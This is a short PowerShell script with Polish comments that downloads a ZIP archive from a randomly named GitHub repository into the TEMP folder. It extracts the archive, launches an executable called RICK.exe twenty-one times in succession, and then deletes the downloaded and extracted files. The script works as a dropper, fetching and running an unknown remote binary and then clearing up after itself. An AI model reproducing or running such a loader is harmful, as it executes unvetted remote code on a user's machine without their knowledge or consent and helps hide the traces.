# Nowy adres URL do pliku ZIP na GitHub
$zipFileUrl = 'https://codeload.github.com/KysGhost1/wdfefgrefgherg/zip/refs/heads/main'

# Lokalna ścieżka, gdzie zostanie zapisany i rozpakowany plik ZIP
$localZipPath = Join-Path $env:TEMP 'GitHubFile.zip'
$extractedFolderPath = Join-Path $env:TEMP 'GitHubExtracted'

# Pobierz plik ZIP z GitHub używając Invoke-WebRequest
Invoke-WebRequest -Uri $zipFileUrl -OutFile $localZipPath

# Rozpakuj plik ZIP
Expand-Archive -Path $localZipPath -DestinationPath $extractedFolderPath -Force

# Wydrukuj zawartość folderu, aby sprawdzić, czy plik jest dostępny
Get-ChildItem -Path $extractedFolderPath

# Otwórz plik (załóżmy, że to plik wykonywalny) po rozpakowaniu
$exeFilePath = Join-Path $extractedFolderPath 'wdfefgrefgherg-main\RICK.exe'
if (Test-Path $exeFilePath) {
    Start-Process -FilePath $exeFilePath
    Start-Process -FilePath $exeFilePath
    Start-Process -FilePath $exeFilePath
    Start-Process -FilePath $exeFilePath
    Start-Process -FilePath $exeFilePath
    Start-Process -FilePath $exeFilePath
    Start-Process -FilePath $exeFilePath
    Start-Process -FilePath $exeFilePath
    Start-Process -FilePath $exeFilePath
    Start-Process -FilePath $exeFilePath
    Start-Process -FilePath $exeFilePath
    Start-Process -FilePath $exeFilePath
    Start-Process -FilePath $exeFilePath
    Start-Process -FilePath $exeFilePath
    Start-Process -FilePath $exeFilePath
    Start-Process -FilePath $exeFilePath
    Start-Process -FilePath $exeFilePath
    Start-Process -FilePath $exeFilePath
    Start-Process -FilePath $exeFilePath
    Start-Process -FilePath $exeFilePath
    Start-Process -FilePath $exeFilePath

} else {
    Write-Host "Plik $exeFilePath nie istnieje."
}

# Opcjonalnie, można usunąć plik ZIP i folder po rozpakowaniu
Remove-Item -Path $localZipPath -Force
Remove-Item -Path $extractedFolderPath -Recurse -Force
